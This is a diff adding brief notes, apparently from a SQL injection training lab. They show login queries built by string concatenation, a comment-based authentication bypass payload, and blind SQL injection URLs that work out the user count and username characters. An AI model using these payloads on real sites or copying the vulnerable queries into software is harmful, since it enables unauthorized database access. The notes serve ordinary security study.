@@ -1,0 +1,24 @@
+
+use ?debug=true 
+
+1- security-> "SELECT * FROM users where username='".$user."'`\
+		` AND password = '.md5($password)."'" 
+	bypass-> user: bob'-- (w/ space after)
+		 password: <any>
+
+2- security-> "SELECT * FROM users where (username='".$user."') 
+		  AND (password = '.md5($password)."')"
+	bypass-> user: bob'-- (w/ space after)
+		 password: <any>
+
+
+3- blind sql injection
+	the website uses blindsqli.php?user=bob to display information about the user 'bob'
+a)
+		changing this to blindsqli.php?user=bob' AND SUBSTRING((select COUNT(id) from users), 1, 1)=9 -- //
+		makes it so the profile 'bob' only appears when the substring condition is true, with this we can verify
+		that the amount of users in the database is 9
+b)
+		additionally we can change it to blindsqli.php?user=bob' AND SUBSTRING((select username from users WHERE
+		username LIKE 'a%' LIMIT 1), 1, 1) = 'a' -- //
+		this makes it so the profile appears if at least 1 username in the database starts with 'a'
